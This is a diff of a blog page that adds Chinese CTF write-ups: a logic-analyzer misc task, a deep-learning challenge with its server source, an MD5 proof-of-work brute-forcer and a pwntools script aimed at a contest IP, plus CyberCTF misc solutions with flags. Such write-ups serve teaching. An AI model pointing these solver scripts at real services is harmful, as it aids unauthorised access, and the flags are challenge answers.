@@ -151,8 +151,8 @@
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2019/08/19/hello-world/">
-                Hello World
+            <a href="/2019/08/19/第十二届全国大学生信息安全竞赛创新实践能力赛/">
+                第12届全国大学生信息安全竞赛
             </a>
         </h1>
         <div class="post-info">
@@ -166,20 +166,805 @@
 
     
         <div class="content">
-            <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
+            <font face="微软雅黑">
 
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<h1 id="第十二届全国大学生信息安全竞赛创新实践能力赛——writeup"><a href="#第十二届全国大学生信息安全竞赛创新实践能力赛——writeup" class="headerlink" title="第十二届全国大学生信息安全竞赛创新实践能力赛——writeup"></a>第十二届全国大学生信息安全竞赛创新实践能力赛——writeup</h1><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h1 id="saleae"><a href="#saleae" class="headerlink" title="saleae"></a>saleae</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h4><p>题目是一个.logicdata文件</p>
+<h4 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h4><p>用saleae logic打开后发现波纹为八个为一格的文件，用同伙的方法八个一格地记录下来</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">01100110</span><br><span class="line">01101100</span><br><span class="line">01100001</span><br><span class="line">01100111</span><br><span class="line">01111011</span><br><span class="line">00110001</span><br><span class="line">00110010</span><br><span class="line">00110000</span><br><span class="line">00110111</span><br><span class="line">00110001</span><br><span class="line">00110011</span><br><span class="line">00111001</span><br><span class="line">00110111</span><br><span class="line">00101101</span><br><span class="line">00110001</span><br><span class="line">00111001</span><br><span class="line">01100100</span><br><span class="line">00110001</span><br><span class="line">00101101</span><br><span class="line">00110100</span><br><span class="line">00111000</span><br><span class="line">01100101</span><br><span class="line">00110110</span><br><span class="line">00101101</span><br><span class="line">01100010</span><br><span class="line">01100101</span><br><span class="line">00111000</span><br><span class="line">01100011</span><br><span class="line">00101101</span><br><span class="line">00110111</span><br><span class="line">00111000</span><br><span class="line">00110100</span><br><span class="line">01100010</span><br><span class="line">00111000</span><br><span class="line">00111001</span><br><span class="line">01100001</span><br><span class="line">00111001</span><br><span class="line">00110101</span><br><span class="line">01100101</span><br><span class="line">00110000</span><br><span class="line">00110111</span><br><span class="line">01111101</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<p>容易看出是二进制转化</p>
+<h4 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h4><p>通过上面的记录编写了个脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'1.txt'</span>) <span class="keyword">as</span> p:</span><br><span class="line">    data = p.readlines()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(data)):</span><br><span class="line">        data[i] = data[i][:<span class="number">8</span>]</span><br><span class="line">        data[i] = int(data[i],<span class="number">2</span>)</span><br><span class="line">        flag += chr(data[i])</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<h4 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;12071397-19d1-48e6-be8c-784b89a95e07&#125;</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+<hr>
+<h1 id="deep-learning"><a href="#deep-learning" class="headerlink" title="deep learning"></a>deep learning</h1><p>做到最后因为imagenet维护没有找到‘503’匹配的wings，然后一直自己尝试也出不来就写写大概思路吧</p>
+<h4 id="Description-1"><a href="#Description-1" class="headerlink" title="Description"></a>Description</h4><p>题目有一个image和一个py文件，py文件为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> inception</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">SALT_LEN = <span class="number">10</span></span><br><span class="line">HEX_LEN = <span class="number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">std_image_name=<span class="string">"/home/ctf/images/image.jpg"</span></span><br><span class="line">input_image_name=<span class="string">''</span></span><br><span class="line">os.environ[<span class="string">'TF_CPP_MIN_LOG_LEVEL'</span>]=<span class="string">'2'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base_str</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span>   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_string</span><span class="params">(length)</span>:</span></span><br><span class="line">    string = [random.choice(base_str()) <span class="keyword">for</span> i <span class="keyword">in</span> range(length)]</span><br><span class="line">    <span class="keyword">return</span> (<span class="string">""</span>.join(string))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tofile</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data=base64.b64decode(data)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span></span><br><span class="line">    filename=<span class="string">"/backup/"</span>+str(time.time())+<span class="string">".jpg"</span></span><br><span class="line">    fd=open(filename,<span class="string">"wb"</span>)</span><br><span class="line">    fd.write(data)</span><br><span class="line">    fd.close()</span><br><span class="line">    filename=<span class="string">"/home/ctf/images/"</span>+str(time.time())+<span class="string">".jpg"</span></span><br><span class="line">    fd=open(filename,<span class="string">"wb"</span>)</span><br><span class="line">    fd.write(data)</span><br><span class="line">    fd.close()</span><br><span class="line">    <span class="keyword">return</span> filename</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> input_image_name</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        input_image=Image.open(input_image_name)</span><br><span class="line">        std_image=Image.open(std_image_name)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"[-]give me a real image!!"</span>)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    input_image_np=np.array(input_image)</span><br><span class="line">    std_image_np=np.array(std_image)</span><br><span class="line">    input_x=len(input_image_np)</span><br><span class="line">    input_y=len(input_image_np[<span class="number">0</span>])</span><br><span class="line">    input_z=len(input_image_np[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">    std_x=len(std_image_np)</span><br><span class="line">    std_y=len(std_image_np[<span class="number">0</span>])</span><br><span class="line">    std_z=len(std_image_np[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> std_x!=input_x <span class="keyword">or</span> std_y!=input_y <span class="keyword">or</span> std_z!=input_z:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    diff=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(input_x):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(input_y):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(input_z):</span><br><span class="line">                <span class="keyword">if</span> input_image_np[i][j][k]&gt;std_image_np[i][j][k]:</span><br><span class="line">                    diff+=input_image_np[i][j][k]-std_image_np[i][j][k]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    diff+=std_image_np[i][j][k]-input_image_np[i][j][k]</span><br><span class="line">    diff=diff/(input_x*input_y*input_z) </span><br><span class="line">    <span class="keyword">if</span> diff&gt;<span class="number">0.8</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">classify</span><span class="params">(image_path)</span>:</span></span><br><span class="line">    model = inception.Inception()</span><br><span class="line">    pred = model.classify(image_path=image_path)</span><br><span class="line">    <span class="keyword">return</span> (pred.argmax(),model.name_lookup.cls_to_name(pred.argmax(),only_first_name=<span class="literal">True</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">()</span>:</span></span><br><span class="line">    fd=open(<span class="string">"/home/ctf/flag"</span>)</span><br><span class="line">    flag=fd.readline()</span><br><span class="line">    fd.close()</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    salt=random_string(SALT_LEN)</span><br><span class="line">    tmpvalue=random_string(<span class="number">20</span>)+salt</span><br><span class="line">    md5=hashlib.md5()</span><br><span class="line">    md5.update(tmpvalue.encode(<span class="string">"utf-8"</span>))</span><br><span class="line">    submd5=md5.hexdigest()[:<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"[*]Proof of work:"</span>)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"\tMD5(key+\"%s\")[:4]==%s"</span>%(salt,submd5))</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"[+]Give me the key:"</span>)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    value=sys.stdin.readline()[:<span class="number">-1</span>]</span><br><span class="line">    value=value+salt</span><br><span class="line">    md5=hashlib.md5()</span><br><span class="line">    md5.update(value.encode(<span class="string">"utf-8"</span>))</span><br><span class="line">    md5value=md5.hexdigest()</span><br><span class="line">    <span class="keyword">if</span>(md5value[:HEX_LEN]!=submd5):</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">"[-]Access Failed"</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"[*]I am the world smartest CV system!"</span>)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"[+]Give me a wing to fly?"</span>)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    <span class="keyword">global</span> input_image_name</span><br><span class="line">    image=sys.stdin.readline()[:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">if</span>(len(image)&gt;<span class="number">200000</span>):</span><br><span class="line">        print(<span class="string">"[-]input too long!"</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    input_image_name=tofile(image)</span><br><span class="line">    <span class="keyword">if</span> input_image_name==<span class="string">""</span>:</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">"[-]base64 please!"</span>)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check():</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">"[-]You cannot fool me!"</span>)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    (input_image_class,input_image_classname)=classify(input_image_name)</span><br><span class="line">    (std_image_class,std_image_classname)=classify(std_image_name)</span><br><span class="line">    <span class="keyword">if</span> input_image_class!=std_image_class <span class="keyword">and</span> input_image_class==<span class="number">503</span>:</span><br><span class="line">        print(<span class="string">"[*]Wow I get the wing"</span>)</span><br><span class="line">        print(<span class="string">"[*]Give you the flag"</span>)</span><br><span class="line"></span><br><span class="line">        print(getflag())</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[*]Give me the wing!"</span>)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
 
+<h4 id="Analyze-1"><a href="#Analyze-1" class="headerlink" title="Analyze"></a>Analyze</h4><p>第一步是一个加盐的md5碰撞，这里用一个暴力破解脚本破解</p>
+<h4 id="Solve-1"><a href="#Solve-1" class="headerlink" title="Solve"></a>Solve</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">CHARS = string.letters + string.digits</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmp_md5</span><span class="params">(salt ,substr, start=<span class="number">0</span>, size=<span class="number">20</span>)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> CHARS</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        str_len = len(substr)</span><br><span class="line">        rnds = <span class="string">''</span>.join(random.choice(CHARS) <span class="keyword">for</span> _ <span class="keyword">in</span> range(size)) + <span class="string">""</span></span><br><span class="line">        md5 = hashlib.md5(rnds + salt)</span><br><span class="line">        <span class="keyword">if</span> md5.hexdigest()[start: start+str_len] == substr:</span><br><span class="line">            <span class="keyword">return</span> rnds</span><br><span class="line">            </span><br><span class="line">print(cmp_md5(<span class="string">"GwoEzpgvOM"</span>, <span class="string">"daca"</span>))</span><br></pre></td></tr></table></figure>
+
+<h4 id="Analyze-2"><a href="#Analyze-2" class="headerlink" title="Analyze"></a>Analyze</h4><p>第二步是上传图片的base64加密信息，这里分成了两部，一个是图像base64加密，另一个是上传。</p>
+<h4 id="Solve-2"><a href="#Solve-2" class="headerlink" title="Solve"></a>Solve</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#base64加密图片</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tofile</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data=base64.b64decode(data)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span></span><br><span class="line">    filename=str(time.time())+<span class="string">".jpg"</span></span><br><span class="line">    fd=open(filename,<span class="string">"wb"</span>)</span><br><span class="line">    fd.write(data)</span><br><span class="line">    fd.close()</span><br><span class="line">    filename=str(time.time())+<span class="string">".jpg"</span></span><br><span class="line">    fd=open(filename,<span class="string">"wb"</span>)</span><br><span class="line">    fd.write(data)</span><br><span class="line">    fd.close()</span><br><span class="line">    <span class="keyword">return</span> filename</span><br><span class="line"></span><br><span class="line">image = base64.b64encode(open(<span class="string">"12.jpg"</span>,<span class="string">"rb"</span>).read())</span><br><span class="line">data = image</span><br><span class="line">miss = <span class="number">4</span>-len(data)%<span class="number">4</span></span><br><span class="line"><span class="keyword">if</span> miss:</span><br><span class="line">    data += <span class="string">b'='</span>*miss</span><br><span class="line">a = open(<span class="string">"12.txt"</span>,<span class="string">'w'</span>)</span><br><span class="line">a.write(data)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#上传图片信息</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> md5 <span class="keyword">import</span> cmp_md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p=process(<span class="string">'./ez_shellcode'</span>)</span><br><span class="line">    context.terminal = [<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>]</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">    gdb.attach(p,<span class="string">'b *0x08048663\nc'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">'39.97.228.196'</span>,<span class="number">20001</span>)</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    <span class="comment">#p.sendline("zmbcen")</span></span><br><span class="line">    </span><br><span class="line">p.recvuntil(<span class="string">"+"</span>)</span><br><span class="line">salt=p.recvuntil(<span class="string">")"</span>)[<span class="number">1</span>:<span class="number">-2</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"salt="</span>+str(salt)</span><br><span class="line">p.recvuntil(<span class="string">"=="</span>)</span><br><span class="line">substr=p.recv(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"substr="</span>+str(substr)</span><br><span class="line"></span><br><span class="line">answer=cmp_md5(salt,substr)</span><br><span class="line">p.recvuntil(<span class="string">"Give me the key:"</span>)</span><br><span class="line">p.sendline(answer)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"./12.txt"</span>,<span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data=f.read()</span><br><span class="line">p.recv()</span><br><span class="line">p.recvuntil(<span class="string">"?"</span>)</span><br><span class="line">p.sendline(data)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h4 id="Analyze-3"><a href="#Analyze-3" class="headerlink" title="Analyze"></a>Analyze</h4><p>最后一步基本看了看后得知这个深度学习是两图像素点之差再求和除以总像素点个数得小于0.8，然后用了PS来修改使原图片像素值和修改后图像达到要求，因为找不到对应图像库’503’号元素是什么，就一直在试wings。。。然后一直得不到正确结果。</p>
+</font>
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2019/07/15/CyberCTF-misc-crypto/">
+                CyberCTF——第一次出题
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2019-07-15</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><hr>
+<h1 id="Sign-in"><a href="#Sign-in" class="headerlink" title="Sign in"></a>Sign in</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h4><p>f菜鸡从网上买了一个鼠标，你能看看是什么吗？</p>
+<p><img src="/2019/07/15/CyberCTF-misc-crypto/C:%5CUsers%5Clijin%5Cd%5Cgithub%5Cblog%5Csource_posts%5CCyberCTF-misc-crypto%5C%E7%AD%BE%E5%88%B0.png" alt="签到"></p>
+<h4 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h4><p>签到题，扫码即可得到flag</p>
+<h4 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h4><p>扫码即可</p>
+<h4 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Welc0Me&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="No-Word"><a href="#No-Word" class="headerlink" title="No Word"></a>No Word</h1><h4 id="Description-1"><a href="#Description-1" class="headerlink" title="Description"></a>Description</h4><p>室友发了一份word给你，能看懂吗？</p>
+<h4 id="Analyze-1"><a href="#Analyze-1" class="headerlink" title="Analyze"></a>Analyze</h4><p>打开文件啥也没有，看hxd有规律的字符，猜测是<code>\t</code>和<code></code>两个字符，这两个字符都不会被显示导致了啥也没有的情况</p>
+<h4 id="Solve-1"><a href="#Solve-1" class="headerlink" title="Solve"></a>Solve</h4><p>先使用替代把<code>\t</code>和<code></code>换成1和0，得到</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">01100110</span></span><br><span class="line"><span class="number">01101100</span></span><br><span class="line"><span class="number">01100001</span></span><br><span class="line"><span class="number">01100111</span></span><br><span class="line"><span class="number">01111011</span></span><br><span class="line"><span class="number">01011001</span></span><br><span class="line"><span class="number">00110000</span></span><br><span class="line"><span class="number">01110101</span></span><br><span class="line"><span class="number">01011111</span></span><br><span class="line"><span class="number">01100011</span></span><br><span class="line"><span class="number">00110100</span></span><br><span class="line"><span class="number">01101110</span></span><br><span class="line"><span class="number">01011111</span></span><br><span class="line"><span class="number">01010010</span></span><br><span class="line"><span class="number">01100101</span></span><br><span class="line"><span class="number">01100001</span></span><br><span class="line"><span class="number">01000100</span></span><br><span class="line"><span class="number">01011111</span></span><br><span class="line"><span class="number">01101110</span></span><br><span class="line"><span class="number">01001111</span></span><br><span 